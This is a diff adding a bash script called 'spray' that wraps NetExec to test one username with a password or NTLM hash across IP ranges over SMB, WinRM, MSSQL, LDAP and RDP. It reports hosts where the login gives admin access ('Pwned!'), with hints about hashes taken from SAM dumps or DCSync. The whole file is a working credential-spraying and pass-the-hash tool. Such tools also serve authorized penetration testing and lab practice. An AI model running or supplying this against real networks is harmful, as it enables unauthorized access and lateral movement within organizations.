@@ -1,0 +1,95 @@
+#!/bin/bash
+
+RED='\033[31m'
+GREEN='\033[32m'
+BLUE='\033[34m'
+YELLOW='\033[33m'
+CYAN='\033[36m'
+NC='\033[0m'
+
+usage() {
+    echo -e "${RED}Usage: spray <target> <user> <pass|hash> [--local-auth] [--smb] [--winrm] [--mssql] [--ldap] [--rdp]${NC}"
+    echo -e "${RED}  Ex:  spray 10.10.10.1-25 administrator Password123${NC}"
+    echo -e "${RED}  Ex:  spray 10.10.10.0/24 administrator 8846f7eaee8fb117ad06bdd830b7586c --local-auth${NC}"
+    echo -e "${RED}  Ex:  spray 10.10.10.5 admin pass --smb --winrm${NC}"
+    echo ""
+    echo -e "${BLUE}  Local auth hint:${NC}"
+    echo -e "${BLUE}    --local-auth  → hash from SAM dump (local account)${NC}"
+    echo -e "${BLUE}    no flag       → hash from NTDS/DCSync (domain account)${NC}"
+    exit 1
+}
+
+[ "$#" -lt 3 ] && usage
+
+TARGET="$1"
+USER="$2"
+CRED="$3"
+shift 3
+
+LOCAL_AUTH=false
+DO_SMB=false
+DO_WINRM=false
+DO_MSSQL=false
+DO_LDAP=false
+DO_RDP=false
+ANY_PROTO=false
+
+for arg in "$@"; do
+    case "$arg" in
+        --local-auth) LOCAL_AUTH=true ;;
+        --smb)   DO_SMB=true;   ANY_PROTO=true ;;
+        --winrm) DO_WINRM=true; ANY_PROTO=true ;;
+        --mssql) DO_MSSQL=true; ANY_PROTO=true ;;
+        --ldap)  DO_LDAP=true;  ANY_PROTO=true ;;
+        --rdp)   DO_RDP=true;   ANY_PROTO=true ;;
+    esac
+done
+
+# Default: all protocols if none specified
+if [ "$ANY_PROTO" = false ]; then
+    DO_SMB=true; DO_WINRM=true; DO_MSSQL=true; DO_LDAP=true; DO_RDP=true
+fi
+
+# Detect hash vs password (32 or 64 hex chars = hash)
+LOCAL_FLAG=""
+[ "$LOCAL_AUTH" = true ] && LOCAL_FLAG="--local-auth"
+
+CRED_FLAG="-p"
+if echo "$CRED" | grep -qP '^[a-f0-9]{32}$|^[a-f0-9]{32}:[a-f0-9]{32}$|^aad3b435[a-f0-9]{24}:[a-f0-9]{32}$'; then
+    CRED_FLAG="-H"
+fi
+
+run_proto() {
+    local proto="$1"
+    echo -e "\n${CYAN}[$proto]${NC}"
+    nxc "$proto" "$TARGET" -u "$USER" "$CRED_FLAG" "$CRED" $LOCAL_FLAG 2>/dev/null | \
+        grep -E '\+|-' | awk '{print $2, $4, $5}'
+}
+
+collect_pwned() {
+    local proto="$1"
+    nxc "$proto" "$TARGET" -u "$USER" "$CRED_FLAG" "$CRED" $LOCAL_FLAG 2>/dev/null | \
+        grep '(Pwned!)' | awk '{print $2}' | tr '\n' ' '
+}
+
+echo ""
+echo -e "${YELLOW}== Spraying: $TARGET ==${NC}"
+[ "$LOCAL_AUTH" = true ] && echo -e "${BLUE}Mode: local-auth (SAM hash)${NC}" || echo -e "${BLUE}Mode: domain auth${NC}"
+
+declare -A SUMMARY
+
+[ "$DO_SMB" = true ]   && run_proto smb   && SUMMARY[SMB]=$(collect_pwned smb)
+[ "$DO_WINRM" = true ] && run_proto winrm && SUMMARY[WinRM]=$(collect_pwned winrm)
+[ "$DO_MSSQL" = true ] && run_proto mssql && SUMMARY[MSSQL]=$(collect_pwned mssql)
+[ "$DO_LDAP" = true ]  && run_proto ldap  && SUMMARY[LDAP]=$(collect_pwned ldap)
+[ "$DO_RDP" = true ]   && run_proto rdp   && SUMMARY[RDP]=$(collect_pwned rdp)
+
+echo ""
+echo -e "${YELLOW}== Summary ==${NC}"
+for proto in SMB WinRM MSSQL LDAP RDP; do
+    [ -z "${SUMMARY[$proto]}" ] && continue
+    if [ -n "${SUMMARY[$proto]}" ]; then
+        echo -e "${GREEN}$proto → ${SUMMARY[$proto]}${NC}"
+    fi
+done
+echo -e "${YELLOW}=================================${NC}"
